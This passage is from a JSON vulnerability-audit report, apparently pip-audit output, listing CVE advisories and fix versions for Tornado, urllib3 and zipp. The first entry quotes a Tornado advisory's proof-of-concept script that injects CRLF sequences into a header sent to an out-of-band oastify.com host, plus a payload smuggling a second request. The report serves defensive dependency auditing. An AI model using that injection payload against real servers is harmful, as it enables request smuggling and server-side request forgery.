be reproduced using the following script:  ```python import asyncio  from tornado import httpclient from tornado import curl_httpclient  async def main():     http_client = curl_httpclient.CurlAsyncHTTPClient()      request = httpclient.HTTPRequest(         # Burp Collaborator payload         \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",         method=\"POST\",         body=\"body\",         # Injected header using CRLF characters         headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}     )      response = await http_client.fetch(request)     print(response.body)      http_client.close()  if __name__ == \"__main__\":     asyncio.run(main()) ```  When the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:  ```http POST / HTTP/1.1 Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com User-Agent: Mozilla/5.0 (compatible; pycurl) Accept: */* Accept-Encoding: gzip,deflate Foo: Bar Header: Injected Content-Length: 4 Content-Type: application/x-www-form-urlencoded  body ```  The attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:  ```http POST /attacker-controlled-url HTTP/1.1 Host: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com Content-Length: 4 Content-Type: application/x-www-form-urlencoded  body ```  ### Impact Applications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "6.4.1"
        ],
        "aliases": []
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-47287 ### Summary  When Tornado's ``multipart/form-data`` parser encounters certain errors, it logs a warning but continues trying to parse the remainder of the data. This allows remote attackers to generate an extremely high volume of logs, constituting a DoS attack. This DoS is compounded by the fact that the logging subsystem is synchronous.  ### Affected versions  All versions of Tornado prior to 6.5 are affected. The vulnerable parser is enabled by default.  ### Solution  Upgrade to Tornado version 6.5. In the meantime, risk can be mitigated by blocking `Content-Type: multipart/form-data` in a proxy.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "6.5"
        ],
        "aliases": [
          "GHSA-7cx3-6m66-7c5m"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-52804 The algorithm used for parsing HTTP cookies in Tornado versions prior to 6.4.2 sometimes has quadratic complexity, leading to excessive CPU consumption when parsing maliciously-crafted cookie headers. This parsing occurs in the event loop thread and may block the processing of other requests.  See also CVE-2024-7592 for a similar vulnerability in cpython.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "6.4.2"
        ],
        "aliases": [
          "GHSA-8w49-h785-mj3c"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-37891 When using urllib3's proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.  However, when sending HTTP requests *without* using urllib3's proxy support, it's possible to accidentally configure the `Proxy-Authorization` header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.  Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.  Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.  ## Affected usages  We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:  * Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support. * Not disabling HTTP redirects. * Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.  ## Remediation  * Using the `Proxy-Authorization` header with urllib3's `ProxyManager`. * Disabling HTTP redirects using `redirects=False` when sending requests. * Not using the `Proxy-Authorization` header.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "1.26.19",
          "2.2.2"
        ],
        "aliases": [
          "GHSA-34jh-p97f-mpxf"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-50181 urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "2.5.0"
        ],
        "aliases": [
          "GHSA-pq67-6m6q-mj2v"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-66418 ## Impact  urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).  However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.   ## Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.   ## Remediation  Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.  If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers[\"content-encoding\"]` contains a safe number of encodings before reading the response content.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "2.6.0"
        ],
        "aliases": [
          "GHSA-gm62-xv2j-4w53"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2025-66471 ### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane. Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/).",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "2.6.0"
        ],
        "aliases": [
          "GHSA-2xpw-w6gg-jr37"
        ]
      }
    },
    {
      "tool": "pip-audit",
      "rule": "VULN",
      "severity": "high",
      "message": "None None -> CVE-2024-5569 A Denial of Service (DoS) vulnerability exists in the jaraco/zipp library, affecting all versions prior to 3.19.1. The vulnerability is triggered when processing a specially crafted zip file that leads to an infinite loop. This issue also impacts the zipfile module of CPython, as features from the third-party zipp library are later merged into CPython, and the affected code is identical in both projects. The infinite loop can be initiated through the use of functions affecting the `Path` module in both zipp and zipfile, such as `joinpath`, the overloaded division operator, and `iterdir`. Although the infinite loop is not resource exhaustive, it prevents the application from responding. The vulnerability was addressed in version 3.19.1 of jaraco/zipp.",
      "file": null,
      "line": null,
      "col": null,
      "extra": {
        "fix_versions": [
          "3.19.1"
        ],
        "aliases": [
          "GHSA-jfmj-5v4g-7637"
        ]
      }
    }
  ],
  "tool_raw": {
    "complexity_radon": {
      "ok": true,
      "stdout": "",
      "stderr": ""
    },
    "mypy": {
      "ok": false,
      "stdout": "",
      "stderr": "There are no .py[i] files in directory 'D:\\code\\PythonWithPycharm\\DataMining\\code_assistant\\my_repo'\n"
    }
  },
  "stats": {
    "total_findings": 60
  }
}